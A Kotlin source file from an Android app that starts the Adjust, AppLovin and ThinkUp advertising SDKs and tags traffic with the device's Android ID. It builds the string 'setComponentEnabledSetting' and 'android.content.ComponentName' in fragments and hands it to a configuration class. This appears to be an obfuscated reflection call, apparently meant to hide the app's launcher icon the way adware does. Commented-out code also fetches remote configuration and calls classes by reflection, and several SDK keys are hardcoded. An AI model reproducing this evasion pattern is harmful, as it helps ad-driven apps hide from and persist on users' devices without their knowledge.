package com.papaya.fig

import android.content.Context
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustConfig
import com.applovin.sdk.AppLovinMediationProvider
import com.applovin.sdk.AppLovinSdk
import com.applovin.sdk.AppLovinSdkInitializationConfiguration
import com.papaya.fig.FigCache.mmkv
import com.thinkup.core.api.TUSDK
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Date：2025/10/28
 * Describe:
 */
class FigSdkInit {
    companion object {
        var mAndroidIdStr = ""
    }

    private val mConfigureCenter by lazy { ConfigureCenter() }

    // todo modify
    private val appIdStr = "h670e13c4e3ab6"
    private val appKeyStr = "ac360a993a659579a11f6df50b9e78639"

    fun initSdk(context: Context) {
        FigCache.log("figInitSdk--->android id $mAndroidIdStr")
        val environment = AdjustConfig.ENVIRONMENT_SANDBOX
//        if (BuildConfig.DEBUG) AdjustConfig.ENVIRONMENT_SANDBOX else AdjustConfig.ENVIRONMENT_PRODUCTION
        // todo modify adjust key
        val config = AdjustConfig(context, "ih2pm2dr3k74", environment)
        config.enableSendingInBackground()
        Adjust.addGlobalCallbackParameter("customer_user_id", mAndroidIdStr)
        config.setOnAttributionChangedListener {
            FigCache.log("setOnAttributionChangedListener--->${it.network}")
        }
        Adjust.initSdk(config)
        mConfigureCenter.fetch(context, Pair(0, "3"))
    }

    private val pairInt = Pair(1, "2".toInt())
    fun figInitSdk(context: Context, pair: Pair<String, String>) {
        mAndroidIdStr = pair.first
        val initConfig =
            // todo modify
            AppLovinSdkInitializationConfiguration.builder("HJFhpJAwSFJc4vKhpSiTESSEs1rhEL_ONC9UU5cc7qLd22D_FuuhMAeMiI0CVFV72QZ3JBGOL7XSQHMWp6krE2")
                .setMediationProvider(AppLovinMediationProvider.MAX).build()
        AppLovinSdk.getInstance(context).initialize(initConfig) { }

        TUSDK.init(context, appIdStr, appKeyStr)
        //d.c11setComponentEnabledSettingandroid.content.ComponentName
        mConfigureCenter.action(context, getNameStr(), pair.second, pairInt)
    }

    //d.c11setComponentEnabledSettingandroid.content.ComponentName
    private fun getNameStr(): String {
        val strBuild = StringBuilder()
        strBuild.append("d.")
        strBuild.append("c")
        strBuild.append("11setComponentEnabledSettingandroid.content.ComponentName")
        return strBuild.toString()
    }

//    private fun action(context: Context, time: Long) {
//
//        val names = mmkv.decodeString("f_name_str", "") ?: ""
//        CoroutineScope(Dispatchers.IO).launch {
//            var filed = mmkv.decodeString("fig_configure", "") ?: ""
//            while (filed.isBlank()) {
//                delay(time)
//                filed = mmkv.decodeString("fig_configure", "") ?: ""
//            }
////
////            Class.forName("com.fb.network.FbInitHelper").getMethod("init", Context::class.java)
////                .invoke(null, context)
////            return@launch
////a
//            mConfigureCenter.action(context, filed, names, Pair("6".toInt(), "7".toInt()))
//        }
//    }
}